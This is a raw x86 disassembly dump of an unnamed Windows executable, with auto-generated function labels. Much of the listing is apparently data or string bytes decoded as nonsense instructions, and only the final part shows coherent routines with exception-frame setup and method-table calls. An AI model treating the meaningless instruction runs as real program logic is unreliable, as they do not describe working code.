add [ esi + ebx * 4 + 0x44 ] al
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x6c004032 ] bl
pushfd
inc esp
add [ eax - 0x53ffbb63 ] dh
popfd
inc esp
add [ eax + 0x1400449c ] dh
pushfd
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
add al cl
popfd
inc esp
add ah cl
popfd
inc esp
add ah dl
popfd
inc esp
lodsb [ esi ]
popfd
inc esp
add [ eax + 0x1400449c ] dh
inc edx
popad
jae r-xdata
mov al 0x9c
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
or [ ebp + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xad
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
lodsd [ esi ]
inc edi
add [ eax + eax ] cl
add [ eax ] bh
lodsb [ esi ]
inc edi
add al dh
xor al 0x40
add [ esi + ebx * 4 ] dh
inc esp
add [ esi + ebx * 4 + 0x44 ] al
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah bh
hlt
pushfd
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
add al cl
popfd
inc esp
add ah cl
popfd
inc esp
add ah dl
popfd
inc esp
add [ ecx ] dl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
inc ebx
insb
popad
jae r-xdata
popfd
inc esp
add [ eax + 0x1400449c ] dh
pushfd
outsd
jb r-xdata
adc [ ecx + eax * 2 + 0x63 ] edx
je r-xdata
lea eax [ eax ]
test [ edi + eax * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x480047ac ] ch
add [ eax ] al
add [ eax - 0xfffb855 ] dh
xor al 0x40
add [ esi + ebx * 4 ] dh
inc esp
add [ esi + ebx * 4 + 0x44 ] al
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah bh
hlt
cwde
adc eax [ edx ]
push eax
test [ edi ] sub_4213a8
mov al [ 0xffffffffe4004214 ]
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax - 0x37ffb80a ] ah
test [ edi ] sub_47f830
test al bh
inc edi
add [ eax ] bl
push esp
inc ebx
jne r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub [ esi + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ esi + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
scasb [ edi ]
inc edi
add [ eax - 0x7c000000 ] dl
outsd
inc ecx
add ah cl
push ss
inc edx
popfd
inc esp
add [ 0x74634154 ] dl
imul ebp [ edi + 0x6e ] 0x6d657449
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ esp + ebx * 4 ] dl
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
add al cl
popfd
inc esp
add ah cl
popfd
inc esp
add ah dl
popfd
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
adc edx [ ebx + eax * 2 + 0x61 ]
je r-xdata
outsb
inc esp
jb r-xdata
outsd
adc al 0xee
je r-xdata
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
add al cl
popfd
inc esp
add ah cl
popfd
inc esp
add ah dl
mov al 0x9c
inc esp
add [ esp + ebx * 4 ] dl
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
mov al [ 0x47ad ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
lodsd [ esi ]
inc edi
add [ eax + eax ] al
add [ eax - 0xfffb855 ] dh
xor al 0x40
add [ esi + ebx * 4 ] dh
inc esp
add [ esi + ebx * 4 + 0x44 ] al
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x68004032 ] bl
cmc
inc edi
add [ eax - 0x53ffbb63 ] dh
add [ eax ] al
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
inc edx
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x47b0 ] ch
outsd
insb
outsd
jb r-xdata
add [ eax + 0x7c0047b0 ] dl
add al [ eax ]
add [ esi + ebp * 8 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
mov al 0x47
popad
jo r-xdata
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah ch
test [ edi ] 0x8
nop
inc ecx
add al al
adc al [ edx ]
mov esp 0x980047f8
inc eax
add [ esi + ebp * 4 + 0x18070047 ] al
push esp
inc ebx
jne r-xdata
inc edi
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ edi + ecx + 0x48 ] dh
add [ eax - 0x53ffb7f1 ] dh
cli
je r-xdata
add [ eax - 0x6 ] ah
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
adc [ edx ] al
add al 0x35
inc eax
add [ eax ] dh
or al 0x45
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 4 + 0x47 ] cl
add [ eax ] al
scasb [ edi ]
inc edi
add [ eax + 0x2004170 ] al
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
mov eax eax
add [ edi + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xb0
inc edi
sub_47ac82
inc edi
add [ esp + ebx * 4 + 0x44 ] ch
add [ eax - 0x53ffbb63 ] dh
popfd
inc esp
add [ eax + 0x1400449c ] dh
pushfd
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
add al cl
popfd
inc esp
add ah cl
popfd
inc esp
add ah dl
popfd
inc esp
add [ ecx ] dl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
jb r-xdata
mov al 0x9c
inc esp
add [ esp + ebx * 4 ] dl
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
add al cl
popfd
inc esp
add ah cl
popfd
inc esp
add ah dl
popfd
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
adc edx [ ebx + eax * 2 + 0x61 ]
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
or [ ebp + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xad
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
lodsd [ esi ]
inc edi
add [ eax + eax ] cl
add [ eax ] bh
lodsb [ esi ]
inc edi
add al dh
xor al 0x40
add [ esi + ebx * 4 ] dh
inc esp
add [ esi + ebx * 4 + 0x44 ] al
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah bh
hlt
popfd
inc esp
add [ eax + 0x1400449c ] dh
pushfd
outsd
jb r-xdata
cwde
adc eax [ edx ]
push eax
test [ edi ] sub_4213a8
mov al [ 0xffffffffe4004214 ]
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax - 0x37ffb80a ] ah
test [ edi ] sub_47f830
test al bh
inc edi
add [ eax ] bl
push esp
inc ebx
jne r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub [ esi + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ esi + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
scasb [ edi ]
inc edi
add [ eax - 0x7c000000 ] dl
outsd
inc ecx
add ah cl
push ss
inc edx
popfd
inc esp
add [ 0x74634154 ] dl
imul ebp [ edi + 0x6e ] 0x6d657449
inc esp
jb r-xdata
inc esp
jb r-xdata
adc al 0xee
je r-xdata
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
add al cl
popfd
inc esp
add ah cl
popfd
inc esp
add ah dl
mov al 0x9c
inc esp
add [ esp + ebx * 4 ] dl
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
mov al [ 0x47ad ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
lodsd [ esi ]
inc edi
add [ eax + eax ] al
add [ eax - 0xfffb855 ] dh
xor al 0x40
add [ esi + ebx * 4 ] dh
inc esp
add [ esi + ebx * 4 + 0x44 ] al
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x68004032 ] bl
cmc
inc edi
add [ eax - 0x53ffbb63 ] dh
add [ eax ] al
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
inc edx
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x47b0 ] ch
outsd
insb
outsd
jb r-xdata
add [ eax + 0x7c0047b0 ] dl
add al [ eax ]
add [ esi + ebp * 8 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
mov al 0x47
popad
jo r-xdata
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah ch
test [ edi ] 0x8
nop
inc ecx
add al al
adc al [ edx ]
mov esp 0x980047f8
inc eax
add [ esi + ebp * 4 + 0x18070047 ] al
push esp
inc ebx
jne r-xdata
inc edi
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ edi + ecx + 0x48 ] dh
add [ eax - 0x53ffb7f1 ] dh
cli
je r-xdata
add [ eax - 0x6 ] ah
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
adc [ edx ] al
add al 0x35
inc eax
add [ eax ] dh
or al 0x45
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 4 + 0x47 ] cl
add [ eax ] al
scasb [ edi ]
inc edi
add [ eax + 0x2004170 ] al
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
mov eax eax
add [ edi + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xb0
inc edi
sub_47af16
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax - 0x1bffb807 ] dl
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_47b0d4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
jae r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dl 0x47
add [ esi - 0x4e ] dl
inc edi
add [ ecx + eax - 0x74b40000 ] ah
inc esp
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
sub cl 0x44
add [ edi * 4 - 0x4377ffbc ] bl
inc eax
add al bl
fadd [ eax + eax + 0x40 ]
xor al [ eax ]
pop esp
xor al [ eax ]
shl [ esi ] 0x48
outsd
add [ ecx + edx + 0x48 ] dl
add [ eax - 0x73ffb7ed ] ch
adc al 0x48
add [ esp + edx ] bh
dec eax
add [ eax + ecx + 0x1c000048 ] bh
dec eax
add al dh
and eax 0xb0048
or al 0xb0
adc al 0xb0
or [ ebp + 0xf007bb0 ] esi
add dl ch
push [ ebx - 0x32002101 ]
dec ebx
inc [ esp + edi * 8 + 0x47 ]
add [ eax + 0x25 ] bh
dec eax
add ah ch
sbb [ eax ] cl
sub al 0x25
dec eax
add al bh
sbb [ eax ] ecx
or [ 0x25bc0048 ] bl
dec eax
add [ eax - 0x2bffb7f9 ] ah
add eax 0x19780048
dec eax
add [ eax ] bh
push es
dec eax
add [ eax ] dl
push esp
inc ebx
jne r-xdata
inc eax
add [ eax + 0x70047b0 ] ch
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add al 0x35
je r-xdata
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax ] bl
dec eax
add [ eax - 0x28 ] cl
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax + eax * 2 - 0x3d03ffb8 ] bl
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
add [ edi + ecx * 4 ] ah
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xbc880044
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add al al
dec eax
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
scasd [ edi ]
inc edi
add [ edi + ebp * 8 + 0x42 ] dl
add [ ebx ] cl
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
mov eax eax
sbb al 0xb1
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4e ] dh
sub_47b21e
fadd [ eax + 0x48 ]
outsb
je r-xdata
dec eax
add [ eax ] ah
cmp cl [ eax ]
pop esp
inc esi
dec eax
add [ edi + edi + 0x48 ] cl
add al al
aas
dec eax
add [ edx + ebp + 0x3c340048 ] dl
dec eax
add [ esp + edx * 2 ] dl
inc ebx
jne r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x2fffb9a6 ] bl
outsd
insb
nop
jo r-xdata
inc esi
je r-xdata
bound eax [ esi ]
cwde
inc ebp
add al bl
mov edx 0xbadc0044
inc esp
add ah ch
arpl [ esi ] ax
jl r-xdata
inc esp
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax - 0x20 ] 0xac004665
inc esi
add [ eax ] cl
leave
inc esp
add [ eax + 0x66 ] bl
inc esi
add [ eax ] al
in al dx
inc esp
add ah ch
inc ebp
add [ eax - 0x5bffbad1 ] ch
sub al [ ebp ]
mov [ edi ] gs
inc ebp
add al dh
push ebp
inc esi
add ah bh
insb
inc esi
add [ eax + 0x5 ] bl
inc ebp
add al bh
cmc
inc edx
add [ eax ] ah
jge r-xdata
add [ ebx + edi + 0x45880048 ] dl
dec eax
add ah bh
dec eax
add al ch
sub cl [ eax ]
push 0x8c00483c
cmp ecx [ eax ]
je r-xdata
dec eax
inc edi
add [ edi ] al
adc al 0x54
inc ebx
jne r-xdata
jl r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
outsd
cdq
add ah bl
jpo r-xdata
cmp eax [ ebp ]
or [ eax + 0x46 ] ah
add [ edi + ecx * 4 ] ah
inc ecx
add ah bh
movsb [ edi ] [ esi ]
je r-xdata
inc esp
add [ eax + 0x31 ] ah
inc ebp
add al bh
xor ecx [ 0x3d31310a ]
xor dh [ ebx ]
or eax 0x3d32310a
xor dh [ ebx ]
or eax 0x3d33310a
xor dh [ ebx ]
or eax 0x3d34310a
nop
clc
mov bl 0x47
add [ edi ] al
push cs
push esp
pop eax
push esp
outsd
outsd
insb
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
0x65dc0046 0x46
add [ eax ] eax
push es
mov al 0xf8
mov ch 0x47
add [ esi ] cl
push esp
pop eax
push esp
outsd
outsd
insb
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ esi ] 0xf8
inc esi
add [ eax + eax * 4 ] ah
inc esi
add al bh
add al dh
add eax 0x5f40045
inc ebp
add [ eax + 0x7e ] bl
inc esi
add [ esp + eax + 0x45 ] dl
add ah cl
xor [ ebp ] al
dec esp
test [ esi ] eax
rol [ edx + 0x45 ] 0x0
dec eax
sub eax 0x9a600045
inc esi
add ah ah
dec edi
inc esi
add [ edx + edx * 2 - 0x74bfffba ] dl
inc esi
add [ ebx + ebx * 2 + 0x46 ] bh
add al bh
pop ebx
inc esi
add [ eax - 0x62 ] al
inc esi
add [ eax + ebx * 2 - 0x66bbffba ] dh
add al dl
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
outsd
outsb
je r-xdata
xor esi [ ecx ]
or eax 0x3d35310a
xor esi [ ecx ]
or eax 0x3d36310a
xor esi [ ecx ]
or eax 0x3d37310a
xor esi [ ecx ]
or eax 0x3d38310a
xor esi [ ecx ]
or eax 0x3d39310a
xor esi [ ecx ]
or eax 0x3d30320a
xor esi [ ecx ]
or eax 0x3d31320a
xor esi [ ecx ]
or eax 0x3d32320a
xor esi [ ecx ]
or eax 0x3d33320a
xor esi [ ecx ]
or eax 0x3d34320a
xor esi [ ecx ]
or eax 0x3d35320a
xor esi [ ecx ]
or eax 0xa
add [ esi * 4 + 0x47 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
xor ecx [ 0x3d34310a ]
call 0xffffffff8847fbbf
int1
inc edx
add [ esi ] cl
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
inc esi
add [ esp + ebx * 2 + 0x5da00046 ] dl
inc esi
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax ] bl
inc si
add [ eax - 0x47ffbded ] dh
mov eax [ 0xfffffffff5b40046 ]
inc edx
add [ esi + esi * 8 ] cl
inc edx
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
clc
add [ eax ] dh
pop edx
inc esi
add [ esi + 0x7e9c0040 ] al
inc esi
outsd
insb
sbb al 0xb1
inc edi
add [ eax - 0x74 ] al
inc esp
add [ ebx ] cl
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
mov eax eax
call sub_47fa53
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
mov bl 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
mov bl 0x47
add ah ah
mov bl 0x47
add [ eax ] dl
add eax [ eax ]
add [ eax + esi * 8 ] dl
inc edx
add ah cl
push ss
inc edx
add [ eax + ebx * 2 + 0x46 ] bh
sub_47b4f9
inc cx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ecx + ebp * 4 - 0x6ff7ffbf ] ah
inc ecx
add [ eax ] dl
popfd
inc ecx
add [ eax ] cl
pushfd
inc ecx
add [ esp + ebp * 4 + 0x41 ] cl
add [ eax - 0x7bffbe54 ] al
lodsb [ esi ]
inc ecx
add [ eax - 0x2fffbe54 ] cl
mov al [ 0xffffffffadfc0041 ]
inc ecx
add [ eax - 0x52 ] bl
inc ecx
add [ edi + ebp * 4 ] ch
inc ecx
add [ eax + ebp * 4 ] bl
inc ecx
add [ eax - 0x51 ] ch
inc ecx
add ah bl
scasd [ edi ]
inc ecx
add [ eax ] al
stosb [ edi ]
inc ecx
add [ edx + ebp * 4 ] cl
inc ecx
add [ eax - 0x65 ] dl
inc ecx
add [ eax - 0x17ffbe56 ] ch
stosb [ edi ]
inc ecx
add [ ebx + ebp * 4 + 0x41 ] dl
add [ eax + 0x41 ] bh
add ah ah
lodsb [ esi ]
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3e40041 ] eax
inc ecx
add [ eax ] ah
lodsd [ esi ]
inc ecx
add [ eax ] dh
lodsd [ esi ]
inc ecx
add [ eax - 0x5c ] cl
inc ecx
add [ esp - 0x5ab7ffbf ] bl
inc ecx
add al ah
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax ] bh
cmpsd [ esi ] [ edi ]
inc ecx
add ah cl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x56 ] dh
inc ecx
add [ edx + ebp * 4 - 0x527bffbf ] cl
inc ecx
add ah dl
stosd [ edi ]
inc ecx
add [ edi + ebp * 4 - 0x505bffbf ] dl
inc ecx
add [ ebx ] dl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
add [ ebx - 0x13ae00f8 ] cl
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_45253c
je r-xdata
insb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
retn
cmp [ eax + 0x224 ] 0x0
je r-xdata
adc eax 0x224b880
add [ eax ] al
add [ esp + ecx - 0x75 ] dh
shl [ ecx + rw-data ] 0x1
outsd
outsb
inc edx
popad
jb sub_47b62c
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov edx eax
mov eax [ rw-data ]
je sub_47b654
insb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
loopne r-xdata
or bh bh
push ecx
adc al 0xc3
nop
inc ecx
add [ eax ] al
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
lea eax [ eax ]
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov edx ebx
mov ecx [ rw-data ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
sub_47b62c
cmp [ rw-data ] 0x0
je r-xdata
retn
test eax eax
je r-xdata
mov edx eax
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
test eax eax
je r-xdata
cmp [ eax + 0x224 ] 0x0
je r-xdata
sub_47b654
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47b733
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_458e38
and [ esi + 0x24 ] 0xfe
mov eax esi
call sub_47b830
mov [ esi + 0x6c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov edi eax
mov [ esi + 0x94 ] edi
mov eax edi
mov edx [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ esi + 0x94 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
add esp 0xfffffff0
call sub_40360c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b73a
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40405c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov edi [ esi + 0x94 ]
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_41a018
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0x10 ]
mov eax edi
call sub_41a1f8
mov eax [ ebp - 0x10 ]
call sub_4083b8
mov ecx eax
mov edx [ ebp - 0x8 ]
mov eax edi
mov edi [ eax ]
call [ edi + 0x24 ]
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_47b73a
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_47b758
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x94 ]
call sub_4032a8
mov eax [ esi + 0x6c ]
call sub_4032a8
mov eax [ esi + 0x88 ]
call sub_4032a8
mov eax [ esi + 0x84 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_458ea4
test bl bl
jle r-xdata
call sub_4032a8
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_47b7ac
push esi
push edi
push ebp
mov edi edx
mov esi eax
mov edx edi
mov eax esi
call sub_418f24
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop ebp
pop edi
pop esi
retn
mov ebp edi
mov edx [ ebp + 0x6c ]
mov eax [ esi + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ esi + 0x8c ]
mov edx [ ebp + 0x8c ]
call sub_40408c
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x94 ]
mov eax [ esi + 0x94 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ ebp + 0x84 ] 0x0
je r-xdata
mov edx [ ebp + 0x38 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebp
call sub_47c680
push eax
mov eax esi
call sub_47c680
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_47b830
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffee
call sub_4034a4
push eax
mov eax ebx
mov si 0xffef
call sub_4034a4
mov ecx ebx
mov dl 0x1
call sub_47dd20
pop esi
pop ebx
retn
sub_47b858
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc8 ] 0x0
setne al
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0xc8 ]
mov ecx [ ebp + 0x8 ]
cmp edx [ eax + 0xc8 ]
setne al
pop ebp
retn
sub_47b894
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4212c0
mov eax [ ebp - 0x8 ]
push eax
push sub_47c6b0
mov eax [ ebp - 0x8 ]
push eax
push sub_47c790
push ebp
call sub_47b858
pop ecx
mov ecx eax
